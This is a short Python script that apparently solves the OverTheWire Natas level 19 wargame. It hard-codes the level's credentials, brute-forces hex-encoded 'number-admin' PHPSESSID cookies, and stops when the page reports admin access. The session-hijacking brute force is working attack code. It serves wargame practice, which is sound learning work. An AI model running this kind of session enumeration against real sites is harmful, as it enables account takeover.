#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Random Hex PHPSESSID

import requests
import re
import codecs

username = 'natas19'
password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
#response = session.get(url, cookies = {"PHPSESSID" : str("%d-admin" % 89).encode('hex')}, auth = (username, password) )
#print(response.text)

for i in range(641):

    session = requests.Session()
    print({"PHPSESSID" : str("%d-admin" % i).encode('utf-8').hex()})
    response = session.get(url, cookies = {"PHPSESSID" : str("%d-admin" % i).encode('utf-8').hex()}, auth = (username, password) )
    # response = session.post(url, data = { "username" : "please", "password" : "subscribe" },  auth = (username, password) )

    # print session.cookies["PHPSESSID"].decode('hex')
    if ( "You are an admin" in response.text ):
        print("Got it!", i)
        print(response.text)
        break